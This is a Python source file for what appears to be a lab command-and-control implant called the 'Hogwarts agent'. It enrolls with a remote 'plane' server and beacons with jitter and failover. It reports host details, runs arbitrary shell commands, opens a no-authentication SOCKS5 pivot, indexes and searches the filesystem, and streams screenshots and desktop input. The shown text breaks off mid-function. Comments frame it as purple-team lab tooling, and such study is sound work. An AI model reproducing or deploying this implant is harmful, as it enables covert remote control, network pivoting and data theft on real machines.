#!/usr/bin/env python3
"""Hogwarts reference agent (lab) — enroll, check-in, execute, sleep.

  hogwarts-agent [-c agent.json]
  hogwarts-agent once -c agent.json
  hogwarts-agent loop -c agent.json

Config keys: plane_url | base_url | base_urls (list/CSV), enroll_secret,
agent_id, agent_token, sleep, jitter, package_id, canary_label, canary_url,
canary_fqdn. Stability: result spool beside config, multi-URL failover,
exponential backoff in loop mode. Package canary fires once on first start.
"""

from __future__ import annotations

import argparse
import hmac
import json
import os
import platform
import random
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urljoin


# Keepstream package (vendored submodule third_party/keepstream)
try:
    from keepstream.server import session_start as _ks_session_start
    from keepstream.server import session_stop as _ks_session_stop
except ImportError:  # pragma: no cover
    _root = Path(__file__).resolve().parents[1]
    _ks = _root / "third_party" / "keepstream" / "src"
    if _ks.is_dir():
        import sys as _sys
        _sys.path.insert(0, str(_ks))
    from keepstream.server import session_start as _ks_session_start
    from keepstream.server import session_stop as _ks_session_stop


VERSION = "0.5.60-lab"
# Keepstream VIDEO codec byte (matches research keepstream-v0)
_KS_CODEC_JPEG = 1
_KS_CODEC_H264 = 2
MIN_SLEEP = 0.12  # Control needs sub-200ms check-ins
# Set by main(); when False, loop only logs enroll/errors/tasks>0 (less disk thrash)
_AGENT_VERBOSE = False
RESULT_CAP = 1_048_576
FILE_CHUNK = 256_000  # default chunk size for download/upload
FILE_CAP = 8_000_000  # hard max total file size (lab)
FS_LIST_CAP = 2_000  # max directory entries returned
FS_INDEX_CAP = 200_000  # max paths held in local walk index
FS_SEARCH_CAP = 2_000  # hard max hits returned per fs_search
SPOOL_CAP = 64  # max pending result posts on disk
BACKOFF_MIN = 2.0
BACKOFF_MAX = 120.0
# Plane allows ~2× RESULT_CAP base64 for "data" — leave headroom for JSON wrapper
SHOT_INLINE_CAP = 1_100_000
SHOT_MAX_SIDE = 1920
SHOT_SIDE_HARD_CAP = 4096
# After screenshot / desktop_input, burn a few fast check-ins (desk Live needs this)
_INTERACTIVE_TYPES = frozenset({"screenshot", "desktop_input"})
_INTERACTIVE_SLEEP = 0.15
_INTERACTIVE_INPUT_SLEEP = 0.10  # after pure input (no heavy screenshot encode)
_INTERACTIVE_JITTER = 0.02
_INTERACTIVE_BURST = 24  # stay turbo while operator is controlling

# Optional long-lived SOCKS session (agent process)
_SOCKS_STATE: dict[str, Any] = {"server": None, "thread": None, "port": None}
# Optional desktop session (VNC process + last capture path)
_DESKTOP_STATE: dict[str, Any] = {
    "mode": None,
    "vnc_proc": None,
    "vnc_port": None,
    "last_shot": None,
}
# Keepstream Session (Spike 1): continuous JPEG + input over TCP
_KEEPSTREAM: dict[str, Any] = {
    "stop": False,
    "thread": None,
    "sock": None,
    "session_id": None,
    "psk": None,
    "port": None,
    # Loopback default — open bind only when operator sets face/bind explicitly
    "bind": "127.0.0.1",
    "max_side": 1280,
    "fps": 60.0,
    "quality": 72,
    "agent_id": "",
    "clients": 0,
    "frame_id": 0,
}

# Local path index (WizFile-class MVP: background walk; MFT/Everything later on Windows)
# entries: list of dicts {path, name, name_l, type, size, mtime}
_FS_INDEX: dict[str, Any] = {
    "state": "idle",  # idle | building | ready | error | stopping
    "roots": [],
    "engine": "walk",
    "count": 0,
    "progress": 0.0,
    "last_built": None,
    "error": None,
    "entries": [],
    "thread": None,
    "stop": False,
    "max_entries": FS_INDEX_CAP,
}

# Cross-cycle runtime (not persisted)
_RUNTIME: dict[str, Any] = {
    "last_error": "",
    "fail_streak": 0,
    "active_url": "",
    "cfg": None,  # last agent.json dict (for optional input_provider)
    "cfg_path": None,
}

# Optional plug-in: user-supplied elevated / UAC input helper (not shipped).
# See CONTRACT + Anguish research/input-broker-v0 · input_provider.
_INPUT_PROVIDER: dict[str, Any] = {
    "spec": None,  # normalized dict or None
    "proc": None,  # subprocess.Popen when kind=exec
    "stream": None,  # text IO to write event lines
    "mode": "local",  # local | provider
    "error": "",
    "lock": None,  # set lazily
}


def _log(msg: str) -> None:
    """Console-safe log (Windows cp1252 cannot print U+2192 → etc.)."""
    try:
        print(msg, flush=True)
    except UnicodeEncodeError:
        try:
            enc = getattr(sys.stdout, "encoding", None) or "utf-8"
            safe = msg.encode(enc, errors="replace").decode(enc, errors="replace")
            print(safe, flush=True)
        except Exception:
            print(msg.encode("ascii", errors="replace").decode("ascii"), flush=True)


def _load_config(path: Path) -> dict[str, Any]:
    if not path.is_file():
        return {}
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}
    return raw if isinstance(raw, dict) else {}


def _save_config(path: Path, cfg: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(cfg, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    try:
        path.chmod(0o600)
    except OSError:
        pass


def _fire_package_canary(cfg: dict[str, Any], cfg_path: Path) -> None:
    """One-shot package canary (HTTP + optional DNS).

    Purple / stolen-export signal: unique canary_label is public (not a secret).
    HTTP hits the plane that minted the package even if enroll is burned or
    base_url is later rewritten — as long as canary_url stays in agent.json.
    DNS canary_fqdn is optional operator zone (watch CF / auth DNS logs).
    Never raises; never blocks enroll.
    """
    if cfg.get("canary_fired_at"):
        return
    label = str(cfg.get("canary_label") or "").strip().lower()
    canary_url = str(cfg.get("canary_url") or "").strip()
    canary_fqdn = str(cfg.get("canary_fqdn") or "").strip().rstrip(".")
    if not label and not canary_url and not canary_fqdn:
        return
    # Derive HTTP URL from plane + label when only label is present
    if not canary_url and label:
        base = ""
        urls = _plane_urls(cfg)
        if urls:
            base = urls[0].rstrip("/")
        if base:
            canary_url = f"{base}/api/v1/canary/{label}"
    http_ok = False
    dns_ok = False
    if canary_url:
        try:
            req = urllib.request.Request(
                canary_url,
                method="GET",
                headers={
                    "User-Agent": f"hogwarts-agent/{VERSION}",
                    "Accept": "application/json",
                },
            )
            with urllib.request.urlopen(req, timeout=4.0) as resp:
                http_ok = 200 <= int(getattr(resp, "status", 200) or 200) < 500
        except Exception as exc:
            if _AGENT_VERBOSE:
                print(f"[agent] canary http: {exc}", flush=True)
    if canary_fqdn:
        try:
            # Force a real resolver query (not just hosts-file cache where possible)
            socket.setdefaulttimeout(3.0)
            socket.getaddrinfo(canary_fqdn, None)
            dns_ok = True
        except Exception as exc:
            if _AGENT_VERBOSE:
                print(f"[agent] canary dns: {exc}", flush=True)
        finally:
            socket.setdefaulttimeout(None)
    # Mark fired even on soft failure so we don't hammer; operator still got
    # best-effort signal if either path worked.
    cfg["canary_fired_at"] = _utc_now()
    cfg["canary_http_ok"] = bool(http_ok)
    cfg["canary_dns_ok"] = bool(dns_ok)
    try:
        _save_config(cfg_path, cfg)
    except Exception:
        pass
    bits = []
    if canary_url:
        bits.append(f"http={'ok' if http_ok else 'fail'}")
    if canary_fqdn:
        bits.append(f"dns={'ok' if dns_ok else 'fail'}")
    print(
        f"[agent] package canary label={label or '?'} {' '.join(bits) or 'noop'}",
        flush=True,
    )


def _utc_now() -> str:
    return (
        datetime.now(timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z")
    )


def _host_facts(cfg: dict[str, Any] | None = None) -> dict[str, Any]:
    hostname = socket.gethostname()
    username = os.environ.get("USER") or os.environ.get("USERNAME") or ""
    uname = platform.uname()
    facts: dict[str, Any] = {
        "hostname": hostname,
        "username": username,
        "os": f"{uname.system} {uname.release}".strip(),
        "arch": uname.machine,
        "external_ip": "",
        "internal_ip": "",
        "agent_version": VERSION,
    }
    # Advertise preferred cadence so plane returns matching sleep (faster desk UX)
    if cfg is not None:
        try:
            if cfg.get("sleep") is not None:
                facts["sleep"] = max(MIN_SLEEP, min(float(cfg.get("sleep")), 120.0))
        except (TypeError, ValueError):
            pass
        try:
            if cfg.get("jitter") is not None:
                facts["jitter"] = max(0.0, min(float(cfg.get("jitter")), 1.0))
        except (TypeError, ValueError):
            pass
    # Turbo: desk Live/Control depends on sub-second check-ins
    burst = int(_RUNTIME.get("interactive_burst") or 0)
    if burst > 0:
        facts["sleep"] = _INTERACTIVE_SLEEP
        facts["jitter"] = _INTERACTIVE_JITTER
        facts["desktop_interactive"] = True
    if _RUNTIME.get("active_url"):
        facts["plane_url"] = str(_RUNTIME["active_url"])
    if _RUNTIME.get("last_error"):
        facts["agent_error"] = str(_RUNTIME["last_error"])[:240]
        facts["agent_fail_streak"] = int(_RUNTIME.get("fail_streak") or 0)
    return facts


def _plane_urls(cfg: dict[str, Any]) -> list[str]:
    """Ordered unique plane base URLs (primary first, then failovers)."""
    urls: list[str] = []

    def _add(u: str) -> None:
        u = u.strip().rstrip("/")
        if u and u not in urls:
            urls.append(u)

    for key in ("base_urls", "plane_urls"):
        v = cfg.get(key)
        if isinstance(v, list):
            for item in v:
                _add(str(item or ""))
        elif isinstance(v, str) and v.strip():
            for part in v.split(","):
                _add(part)

    # Prefer last-known-good if set
    for key in ("base_url", "plane_url"):
        _add(str(cfg.get(key) or ""))

    # Env override always wins as highest priority if set
    env = os.environ.get("PLANE_URL") or os.environ.get("PLANE_URLS") or ""
    if env.strip():
        env_urls = [p.strip() for p in env.split(",") if p.strip()]
        # prepend env urls
        merged: list[str] = []
        for u in env_urls:
            u = u.rstrip("/")
            if u and u not in merged:
                merged.append(u)
        for u in urls:
            if u not in merged:
                merged.append(u)
        return merged
    return urls


def _spool_path(cfg_path: Path) -> Path:
    return cfg_path.parent / f"{cfg_path.stem}.spool.json"


class ResultSpool:
    """Durable queue of task results that failed to POST (plane blip / path flap)."""

    def __init__(self, path: Path) -> None:
        self.path = path

    def load(self) -> list[dict[str, Any]]:
        if not self.path.is_file():
            return []
        try:
            raw = json.loads(self.path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            return []
        if isinstance(raw, list):
            return [x for x in raw if isinstance(x, dict)]
        if isinstance(raw, dict) and isinstance(raw.get("items"), list):
            return [x for x in raw["items"] if isinstance(x, dict)]
        return []

    def save(self, items: list[dict[str, Any]]) -> None:
        items = items[-SPOOL_CAP:]
        self.path.parent.mkdir(parents=True, exist_ok=True)
        payload = {"version": 1, "updated": _utc_now(), "items": items}
        self.path.write_text(
            json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
        try:
            self.path.chmod(0o600)
        except OSError:
            pass

    def push(self, task_id: str, status: str, result: dict[str, Any]) -> None:
        items = self.load()
        # de-dupe by task_id (latest wins)
        items = [x for x in items if str(x.get("task_id")) != task_id]
        items.append(
            {
                "task_id": task_id,
                "status": status,
                "result": result,
                "queued_at": _utc_now(),
            }
        )
        self.save(items)
        print(
            f"[agent] spooled result {task_id} ({len(items)} pending)",
            flush=True,
        )

    def drain(self, client: "AgentClient") -> int:
        items = self.load()
        if not items:
            return 0
        remaining: list[dict[str, Any]] = []
        sent = 0
        for i, item in enumerate(items):
            tid = str(item.get("task_id") or "")
            if not tid:
                continue
            try:
                client.results(
                    tid,
                    str(item.get("status") or "failed"),
                    item.get("result") if isinstance(item.get("result"), dict) else {},
                )
                sent += 1
                print(f"[agent] spool flush {tid} ok", flush=True)
            except Exception as exc:
                print(f"[agent] spool flush {tid} fail: {exc}", flush=True)
                # stop on first failure — plane likely still down
                remaining = items[i:]
                break
        if remaining:
            self.save(remaining)
        elif self.path.is_file():
            try:
                self.path.unlink()
            except OSError:
                self.save([])
        return sent


def backoff_delay(fail_streak: int) -> float:
    """Exponential backoff with jitter: 2, 4, 8… capped at BACKOFF_MAX."""
    exp = min(max(0, fail_streak - 1), 6)
    base = min(BACKOFF_MAX, BACKOFF_MIN * (2**exp))
    jitter = 1.0 + random.uniform(-0.25, 0.25)
    return max(MIN_SLEEP, base * jitter)


class AgentClient:
    def __init__(self, base_url: str, token: str | None = None) -> None:
        self.base_url = base_url.rstrip("/") + "/"
        self.token = token

    def _request(
        self,
        method: str,
        path: str,
        body: dict[str, Any] | None = None,
        *,
        auth: bool = True,
    ) -> Any:
        url = urljoin(self.base_url, path.lstrip("/"))
        data = None
        headers = {
            "Accept": "application/json",
            "User-Agent": f"hogwarts-agent/{VERSION}",
        }
        if auth and self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                raw = resp.read().decode("utf-8")
                return json.loads(raw) if raw.strip() else {}
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")
            raise RuntimeError(f"HTTP {exc.code}: {detail or exc.reason}") from exc
        except urllib.error.URLError as exc:
            raise RuntimeError(f"unreachable: {exc.reason}") from exc

    def enroll(self, enroll_secret: str, facts: dict[str, Any]) -> dict[str, Any]:
        body = {"enroll_secret": enroll_secret, **facts}
        return self._request("POST", "/api/v1/agent/enroll", body, auth=False)

    def checkin(self, facts: dict[str, Any]) -> dict[str, Any]:
        return self._request("POST", "/api/v1/agent/checkin", facts)

    def results(self, task_id: str, status: str, result: dict[str, Any]) -> Any:
        return self._request(
            "POST",
            "/api/v1/agent/results",
            {"task_id": task_id, "status": status, "result": result},
        )


def _cap(s: str) -> tuple[str, bool]:
    if len(s) <= RESULT_CAP:
        return s, False
    return s[:RESULT_CAP], True


def _socks_stop() -> dict[str, Any]:
    srv = _SOCKS_STATE.get("server")
    if srv is not None:
        try:
            srv.shutdown()
        except Exception:
            pass
        try:
            srv.server_close()
        except Exception:
            pass
    _SOCKS_STATE["server"] = None
    _SOCKS_STATE["thread"] = None
    port = _SOCKS_STATE.get("port")
    _SOCKS_STATE["port"] = None
    return {"stopped": True, "port": port}


def _socks_start(port: int = 0) -> dict[str, Any]:
    """Minimal SOCKS5 (CONNECT only) for lab pivots — not production hardened."""
    import select
    import socketserver
    import struct
    import threading

    if _SOCKS_STATE.get("server") is not None:
        return {
            "already_running": True,
            "port": _SOCKS_STATE.get("port"),
            "bind": _SOCKS_STATE.get("bind") or "127.0.0.1",
        }

    class _Handler(socketserver.StreamRequestHandler):
        def handle(self) -> None:
            try:
                header = self.connection.recv(2)
                if len(header) < 2 or header[0] != 5:
                    return
                nmethods = header[1]
                self.connection.recv(nmethods)
                self.connection.sendall(b"\x05\x00")  # no auth
                req = self.connection.recv(4)
                if len(req) < 4 or req[0] != 5 or req[1] != 1:
                    self.connection.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                    return
                atyp = req[3]
                if atyp == 1:  # IPv4
                    addr = socket.inet_ntoa(self.connection.recv(4))
                elif atyp == 3:  # domain
                    ln = self.connection.recv(1)[0]
                    addr = self.connection.recv(ln).decode("utf-8", "replace")
                else:
                    self.connection.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
                    return
                port_b = self.connection.recv(2)
                dport = struct.unpack("!H", port_b)[0]
                remote = socket.create_connection((addr, dport), timeout=15)
                # success bind reply (0.0.0.0:0)
                self.connection.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
                self._relay(self.connection, remote)
            except Exception:
                try:
                    self.connection.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                except Exception:
                    pass

        def _relay(self, a: socket.socket, b: socket.socket) -> None:
            try:
                while True:
                    r, _, _ = select.select([a, b], [], [], 60)
                    if not r:
                        break
                    for s in r:
                        data = s.recv(65536)
                        if not data:
                            return
                        (b if s is a else a).sendall(data)
            finally:
                try:
                    b.close()
                except Exception:
                    pass

    class _Server(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        daemon_threads = True

    # Loopback by default — open 0.0.0.0 only if operator sets SOCKS_BIND
    bind_host = (os.environ.get("SOCKS_BIND") or "127.0.0.1").strip() or "127.0.0.1"
    srv = _Server((bind_host, int(port or 0)), _Handler)
    bind_port = int(srv.server_address[1])
    th = threading.Thread(target=srv.serve_forever, daemon=True, name="socks5")
    th.start()
    _SOCKS_STATE["server"] = srv
    _SOCKS_STATE["thread"] = th
    _SOCKS_STATE["port"] = bind_port
    _SOCKS_STATE["bind"] = bind_host
    return {
        "started": True,
        "port": bind_port,
        "bind": bind_host,
        "proto": "socks5",
        "auth": "none",
        "note": "lab SOCKS is no-auth; prefer 127.0.0.1 + path tunnel",
    }


def _resolve_shell_argv(shell: str, cmd: str) -> tuple[list[str], str]:
    """Map shell id → argv. Returns (argv, resolved_shell_id)."""
    key = (shell or "auto").strip().lower()
    if key in ("", "auto", "default"):
        if os.name == "nt":
            return ["cmd", "/c", cmd], "cmd"
        return ["/bin/sh", "-c", cmd], "sh"

    mapping: dict[str, list[str]] = {
        "sh": ["/bin/sh", "-c", cmd],
        "bash": ["bash", "-c", cmd],
        "zsh": ["zsh", "-c", cmd],
        "fish": ["fish", "-c", cmd],
        "cmd": ["cmd", "/c", cmd],
        "powershell": [
            "powershell",
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            cmd,
        ],
        "ps": [
            "powershell",
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            cmd,
        ],
        "pwsh": ["pwsh", "-NoProfile", "-NonInteractive", "-Command", cmd],
    }
    if key not in mapping:
        raise ValueError(f"unknown_shell:{key}")
    # Prefer absolute /bin paths when present (POSIX)
    argv = list(mapping[key])
    if key in ("bash", "zsh", "fish") and os.name != "nt":
        for cand in (f"/bin/{key}", f"/usr/bin/{key}"):
            if Path(cand).is_file():
                argv[0] = cand
                break
    resolved = "powershell" if key == "ps" else key
    return argv, resolved


def _fs_list(path: str, *, show_hidden: bool = False) -> dict[str, Any]:
    """Structured directory listing for remote view."""
    raw = (path or "").strip() or ("." if os.name != "nt" else str(Path.home()))
    p = Path(raw).expanduser()
    try:
        if not p.exists():
            return {"error": "not_found", "path": str(p)}
        focus: str | None = None
        if not p.is_dir():
            # listing a file → show parent with focus name
            focus = p.name
            p = p.parent
        p = p.resolve(strict=False)
        if not p.is_dir():
            return {"error": "not_a_directory", "path": str(p)}
        entries: list[dict[str, Any]] = []
        try:
            children = list(p.iterdir())
        except PermissionError:
            return {"error": "permission_denied", "path": str(p)}
        children.sort(key=lambda c: (not c.is_dir(), c.name.lower()))
        for child in children:
            name = child.name
            if not show_hidden and name.startswith("."):
                continue
            try:
                st = child.lstat()
            except OSError:
                continue
            if child.is_symlink():
                typ = "link"
            elif child.is_dir():
                typ = "dir"
            elif child.is_file():
                typ = "file"
            else:
                typ = "other"
            ent: dict[str, Any] = {
                "name": name,
                "type": typ,
                "size": int(st.st_size) if typ in ("file", "link", "other") else None,
                "mtime": int(st.st_mtime),
                "mode": oct(st.st_mode & 0o777),
            }
            if typ == "link":
                try:
                    ent["target"] = os.readlink(child)
                except OSError:
                    pass
            entries.append(ent)
            if len(entries) >= FS_LIST_CAP:
                break
        out: dict[str, Any] = {
            "path": str(p),
            "entries": entries,
            "count": len(entries),
            "truncated": len(children) > len(entries)
            or (not show_hidden and any(c.name.startswith(".") for c in children)),
            "parent": str(p.parent) if p.parent != p else None,
            "sep": os.sep,
        }
        if focus:
            out["focus"] = focus
        return out
    except OSError as exc:
        return {"error": str(exc), "path": raw}


def _fs_index_default_roots() -> list[str]:
    """Sensible default roots for walk index (not entire network mounts)."""
    if os.name == "nt":
        roots: list[str] = []
        # Prefer user profile + common drive letters that exist
        home = str(Path.home())
        if home:
            roots.append(home)
        for letter in "CDEFG":
            drive = f"{letter}:\\"
            if Path(drive).exists() and drive.rstrip("\\") not in {
                r.rstrip("\\") for r in roots
            }:
                # Avoid double-adding C: if home is under C:
                if letter == "C" and home.upper().startswith("C:"):
                    continue
                roots.append(drive)
        return roots or ["C:\\"]
    roots = []
    home = str(Path.home())
    if home:
        roots.append(home)
    for p in ("/tmp", "/var", "/opt", "/usr", "/home"):
        if Path(p).is_dir() and p not in roots:
            # Don't auto-walk all of / — too huge for lab MVP unless home-only
            if p in ("/tmp",):
                roots.append(p)
    return roots or ["/"]


def _fs_index_status_payload() -> dict[str, Any]:
    st = _FS_INDEX
    return {
        "state": st.get("state") or "idle",
        "progress": float(st.get("progress") or 0.0),
        "count": int(st.get("count") or 0),
        "roots": list(st.get("roots") or []),
        "engine": st.get("engine") or "walk",
        "last_built": st.get("last_built"),
        "error": st.get("error"),
        "max_entries": int(st.get("max_entries") or FS_INDEX_CAP),
        "note": (
            "walk index is searchable but slower than MFT/Everything; "
            "Windows agents may upgrade engine later"
        ),
    }


def _fs_index_worker(roots: list[str], max_entries: int) -> None:
    """Background os.walk indexer. Keeps agent responsive via check-in loop."""
    import threading

    entries: list[dict[str, Any]] = []
    _FS_INDEX["state"] = "building"
    _FS_INDEX["progress"] = 0.0
    _FS_INDEX["count"] = 0
    _FS_INDEX["error"] = None
    _FS_INDEX["entries"] = []
    seen_dirs = 0
    try:
        for root in roots:
            if _FS_INDEX.get("stop"):
                break
            root_p = Path(root).expanduser()
            try:
                root_p = root_p.resolve(strict=False)
            except OSError:
                pass
            if not root_p.exists():
                continue
            # Include root itself
            try:
                st = root_p.lstat()
                entries.append(
                    {
                        "path": str(root_p),
                        "name": root_p.name or str(root_p),
                        "name_l": (root_p.name or str(root_p)).lower(),
                        "type": "dir" if root_p.is_dir() else "file",
                        "size": int(st.st_size) if root_p.is_file() else None,
                        "mtime": int(st.st_mtime),
                    }
                )
            except OSError:
                pass
            if not root_p.is_dir():
                continue
            for dirpath, dirnames, filenames in os.walk(
                str(root_p), topdown=True, followlinks=False, onerror=None
            ):
                if _FS_INDEX.get("stop"):
                    break
                # Skip heavy / virtual trees on Unix
                base = os.path.basename(dirpath)
                if base in (
                    ".git",
                    "node_modules",
                    "__pycache__",
                    ".cache",
                    "proc",
                    "sys",
                    "dev",
                ):
                    dirnames[:] = []
                    continue
                # Prune dirnames in place for known noise
                dirnames[:] = [
                    d
                    for d in dirnames
                    if d
                    not in (
                        ".git",
                        "node_modules",
                        "__pycache__",
                        ".cache",
                        "$Recycle.Bin",
                        "System Volume Information",
                    )
                ]
                seen_dirs += 1
                for name, typ in (
                    *[(d, "dir") for d in dirnames],
                    *[(f, "file") for f in filenames],
                ):
                    if _FS_INDEX.get("stop"):
                        break
                    if len(entries) >= max_entries:
                        _FS_INDEX["stop"] = True
                        break
                    full = os.path.join(dirpath, name)
                    size = None
                    mtime = 0
                    try:
                        st = os.lstat(full)
                        mtime = int(st.st_mtime)
                        if typ == "file":
                            size = int(st.st_size)
                    except OSError:
                        pass
                    entries.append(
                        {
                            "path": full,
                            "name": name,
                            "name_l": name.lower(),
                            "type": typ,
                            "size": size,
                            "mtime": mtime,
                        }
                    )
                if seen_dirs % 25 == 0:
                    _FS_INDEX["count"] = len(entries)
                    # Soft progress: asymptotic toward 0.95 while building
                    _FS_INDEX["progress"] = min(0.95, len(entries) / max(max_entries, 1))
                    _FS_INDEX["entries"] = entries  # partial visible for search
        truncated = len(entries) >= max_entries or bool(_FS_INDEX.get("stop"))
        _FS_INDEX["entries"] = entries
        _FS_INDEX["count"] = len(entries)
        _FS_INDEX["progress"] = 1.0 if not _FS_INDEX.get("stop") or truncated else 1.0
        if _FS_INDEX.get("stop") and not truncated and len(entries) < max_entries:
            # User cancelled mid-build
            _FS_INDEX["state"] = "ready" if entries else "idle"
            _FS_INDEX["error"] = "stopped" if not entries else None
        else:
            _FS_INDEX["state"] = "ready"
            _FS_INDEX["error"] = "truncated" if truncated else None
        _FS_INDEX["last_built"] = _utc_now()
        _FS_INDEX["stop"] = False
    except Exception as exc:
        _FS_INDEX["state"] = "error"
        _FS_INDEX["error"] = str(exc)
        _FS_INDEX["entries"] = entries
        _FS_INDEX["count"] = len(entries)
        _FS_INDEX["last_built"] = _utc_now()
    finally:
        _FS_INDEX["thread"] = None


def _fs_index_start(payload: dict[str, Any]) -> dict[str, Any]:
    import threading

    thr = _FS_INDEX.get("thread")
    if thr is not None and getattr(thr, "is_alive", lambda: False)():
        return {
            "started": False,
            "error": "already_building",
            **_fs_index_status_payload(),
        }
    roots_raw = payload.get("roots")
    if isinstance(roots_raw, str) and roots_raw.strip():
        roots = [roots_raw.strip()]
    elif isinstance(roots_raw, list) and roots_raw:
        roots = [str(r).strip() for r in roots_raw if str(r).strip()]
    else:
        roots = _fs_index_default_roots()
    try:
        max_entries = int(payload.get("max_entries") or FS_INDEX_CAP)
    except (TypeError, ValueError):
        max_entries = FS_INDEX_CAP
    max_entries = max(1_000, min(max_entries, FS_INDEX_CAP))
    _FS_INDEX["roots"] = roots
    _FS_INDEX["max_entries"] = max_entries
    _FS_INDEX["stop"] = False
    _FS_INDEX["engine"] = "walk"
    t = threading.Thread(
        target=_fs_index_worker,
        args=(roots, max_entries),
        name="hogwarts-fs-index",
        daemon=True,
    )
    _FS_INDEX["thread"] = t
    t.start()
    return {"started": True, **_fs_index_status_payload()}


def _fs_index_stop() -> dict[str, Any]:
    thr = _FS_INDEX.get("thread")
    if thr is not None and getattr(thr, "is_alive", lambda: False)():
        _FS_INDEX["stop"] = True
        _FS_INDEX["state"] = "stopping"
        return {"stopping": True, **_fs_index_status_payload()}
    return {"stopping": False, **_fs_index_status_payload()}


def _fs_search(payload: dict[str, Any]) -> dict[str, Any]:
    query = str(payload.get("query") or payload.get("q") or "").strip()
    if not query:
        return {"error": "empty_query", "hits": [], "count": 0, "total": 0}
    path_prefix = str(payload.get("path_prefix") or payload.get("prefix") or "").strip()
    try:
        limit = int(payload.get("limit") or 200)
    except (TypeError, ValueError):
        limit = 200
    try:
        offset = int(payload.get("offset") or 0)
    except (TypeError, ValueError):
        offset = 0
    limit = max(1, min(limit, FS_SEARCH_CAP))
    offset = max(0, offset)

    entries: list[dict[str, Any]] = list(_FS_INDEX.get("entries") or [])
    state = str(_FS_INDEX.get("state") or "idle")
    if not entries and state in ("idle", "error"):
        return {
            "error": "no_index",
            "index_state": state,
            "hits": [],
            "count": 0,
            "total": 0,
            "hint": "call fs_index_start first",
        }

    q = query.lower()
    # Support simple * wildcards → substring pieces
    if "*" in q:
        parts = [p for p in q.split("*") if p]
    else:
        parts = [q]

    prefix_l = path_prefix.lower().replace("/", os.sep).replace("\\", os.sep)
    hits_all: list[dict[str, Any]] = []
    for ent in entries:
        name_l = str(ent.get("name_l") or ent.get("name") or "").lower()
        path = str(ent.get("path") or "")
        path_l = path.lower()
        if prefix_l and not path_l.startswith(prefix_l.rstrip("\\/").lower()):
            # also allow prefix without strict trailing
            if not path_l.startswith(prefix_l.lower()):
                continue
        if parts:
            # all parts must appear in name or full path
            blob = f"{name_l} {path_l}"
            if not all(p in blob for p in parts):
                continue
        hits_all.append(
            {
                "path": path,
                "name": ent.get("name"),
                "type": ent.get("type") or "file",
                "size": ent.get("size"),
                "mtime": ent.get("mtime"),
            }
        )
        # early exit if we only need a page and have enough for offset+limit
        if len(hits_all) >= offset + limit + 1:
            # keep scanning for total? for large indexes total is expensive —
            # approximate: if more exist, mark truncated later
            pass

    total = len(hits_all)
    # If we stopped early, total is lower bound
    page = hits_all[offset : offset + limit]
    return {
        "query": query,
        "path_prefix": path_prefix or None,
        "hits": page,
        "count": len(page),
        "total": total,
        "offset": offset,
        "limit": limit,
        "truncated": total > offset + limit or (
            len(hits_all) >= offset + limit + 1 and total == len(hits_all)
        ),
        "index_state": state,
        "index_count": int(_FS_INDEX.get("count") or 0),
        "engine": _FS_INDEX.get("engine") or "walk",
    }


def _png_rgb(width: int, height: int, rgb_rows: bytes) -> bytes:
    """Minimal RGB PNG (no filter tricks). rgb_rows = filter0+RGB per row concatenated."""
    import struct
    import zlib

    def chunk(tag: bytes, data: bytes) -> bytes:
        return (
            struct.pack(">I", len(data))
            + tag
            + data
            + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
        )

    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", ihdr)
        + chunk(b"IDAT", zlib.compress(rgb_rows, 6))
        + chunk(b"IEND", b"")
    )


def _synthetic_desktop_png(*, label: str = "") -> tuple[bytes, int, int, str]:
    """Headless/lab frame: gradient + ticker so remote view works without a real display."""
    w, h = 720, 405
    t = int(time.time())
    host = socket.gethostname()[:24]
    rows = bytearray()
    for y in range(h):
        rows.append(0)  # filter none
        for x in range(w):
            # purple castle-ish gradient + sweep bar
            r = 18 + (x * 40) // w
            g = 16 + (y * 28) // h
            b = 36 + ((x + y + t * 3) % 80)
            if abs(x - ((t * 40) % w)) < 3:
                r, g, b = 200, 180, 90
            # top banner band
            if y < 36:
                r, g, b = 28, 24, 48
            rows.extend((r & 255, g & 255, b & 255))
    # stamp a crude 5x7 font is heavy — encode label into pixel strip via ASCII bars
    text = f"HOGWARTS {host} {t} {label}"[:80]
    for i, ch in enumerate(text.encode("ascii", errors="replace")):
        x0 = 8 + i * 6
        if x0 + 5 >= w:
            break
        for dy in range(7):
            for dx in range(5):
                bit = (ch >> (dx + dy % 3)) & 1
                if not bit:
                    continue
                xx, yy = x0 + dx, 12 + dy
                if 0 <= xx < w and 0 <= yy < h:
                    off = yy * (1 + w * 3) + 1 + xx * 3
                    rows[off : off + 3] = bytes((230, 220, 180))
    raw = _png_rgb(w, h, bytes(rows))
    return raw, w, h, "synthetic"


def _jpeg_quality_for_side(
    max_side: int, *, live: bool = False, quality: int | None = None
) -> int:
    """JPEG quality: sharper for still captures and clear Session; lighter for task Live."""
    if quality is not None:
        try:
            return max(28, min(int(quality), 95))
        except (TypeError, ValueError):
            pass
    if live:
        # Readable UI text at stream sizes (was too muddy at q40–48)
        if max_side <= 640:
            return 52
        if max_side <= 960:
            return 58
        if max_side <= 1280:
            return 64
        if max_side <= 1600:
            return 68
        return 70
    # Still Capture — prefer readable text/UI
